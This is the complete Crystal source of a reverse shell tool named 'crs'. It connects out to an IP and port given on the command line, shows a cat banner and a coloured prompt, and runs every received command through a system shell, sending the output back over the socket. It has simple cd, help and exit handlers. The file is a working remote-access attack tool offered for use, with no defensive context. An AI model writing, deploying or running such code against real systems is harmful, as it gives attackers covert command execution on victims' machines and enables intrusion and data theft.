require "socket"
require "crolorama"

def motd
  cat = "       _                        ".reverse + "\n"
  cat += "       `*-.                    ".reverse + "\n"
  cat += "        )  _`-.                 ".reverse + "\n"
  cat += "       .  : `. .                ".reverse + "\n"
  cat += "       : _   '                 ".reverse + "\n"
  cat += "       ; *` _.   `*-._          ".reverse + "\n"
  cat += "       `-.-'          `-.       ".reverse + "\n"
  cat += "         ;       `       `.     ".reverse + "\n"
  cat += "         :.       .            ".reverse + "\n"
  cat += "         .   .   :   .-'   .   ".reverse + "\n"
  cat += "         '  `+.;  ;  '      :   ".reverse + "\n"
  cat += "         :  '  |    ;       ;-. ".reverse + "\n"
  cat += "         ; '   : :`-:     _.`* ;".reverse + "\n"
  cat += "]src[ .*' /  .*' ; .*`- +'  `*' ".reverse + "\n"
  cat += "      `*-*   `*-*  `*-*'        ".reverse + "\n"
  return cat
end

def exec(cmd : String)
  col = Crolorama::Color.new
  stdout = IO::Memory.new
  stderr = IO::Memory.new
  begin
    status = Process.run(command: cmd, args: nil, shell: true, output: stdout, error: stderr)
  rescue ex
    return "#{col.fg("red")}#{ex.message}#{col.reset}\n"
  end
  if status.success?
    return stdout.to_s
  else
    return "ExecutionError :: #{stderr}"
  end
end

def shell_exit(sock : Socket)
  sock.send("===== Bye, Bye from CRS =====")
  sock.close
  exit 0
end

def shell_cd(sock : Socket, cmd : String)
  # Todo: Implement method for parsing args
  col = Crolorama::Color.new
  if cmd.count(" ") == 0
    args = nil
  else
    args = cmd.split(" ")[1..-1]
    cmd = cmd.split(" ")[0]
  end
  if args
    if Dir.exists? args[0]
      Dir.cd Path[args[0]]
    else
      sock.send "#{col.fg("red")}cd: no such file or directory: #{args[0]}#{col.reset}\n"
    end
  else
    Dir.cd Path[ENV["HOME"]]
  end
end

def get_pwd
  pwd = exec("pwd")
  return pwd[0..-2]
end

def help(sock : Socket)
  col = Crolorama::Color.new
  commands = {} of String => String
  commands["exit,quit,bye,q"] = "Close connection and quit"
  commands["help,?"] = "Print this help page"
  commands["cd"] = "Change directory"

  sock.send "===== man CRS =====\n"
  commands.each do |el|
    if el[0].count(",") == 0
      sock.send "    #{col.style("bright")}#{el[0]}#{col.reset_all} :: #{el[1]}\n"
    else
      sock.send "    #{col.style("bright")}#{el[0].split(",")[0]}#{col.reset_all} :: #{el[1]} (#{col.style("bright")}#{el[0].split(",")[1..-1].join(",")}#{col.reset_all})\n"
    end
  end
  sock.send ""
end

def prompt
  col = Crolorama::Color.new
  return "#{col.bg("white")}#{col.fg("black")}[#{ENV["USER"]}@crs#{col.bg("green")}#{col.fg("white")}#{col.fg("black")} #{get_pwd.split("/")[0..-2].join("/")}/#{col.style("bright")}#{get_pwd.split("/")[-1]}#{col.reset_all}#{col.fg("green")}𝅙#{col.reset} "
end

def reverse_shell(addr : String, port : Int32)
  begin
    sock = Socket.tcp(Socket::Family::INET)
    sock.connect addr, port
  rescue ex : Socket::ConnectError
    exit
  end

  # sock.send("===== crs (crystal reverse shell) =====\n")
  sock.send motd
  while !sock.closed?
    sock.send prompt
    cmd, client_addr = sock.receive
    cmd = cmd.strip
    case cmd
    when "exit"
      shell_exit sock
    when "quit"
      shell_exit sock
    when "bye"
      shell_exit sock
    when "q"
      shell_exit sock
    when "help"
      help sock
    when "?"
      help sock
    when "cd"
      shell_cd sock, cmd
    else
      output = exec cmd
      sock.send output
    end
  end
  puts "Done"
end

if ARGV.size == 2
  begin
    reverse_shell ARGV[0], ARGV[1].to_i
  rescue ex
    puts ex.message
  end
else
  puts "Usage: ./reverse_shell IP PORT"
end
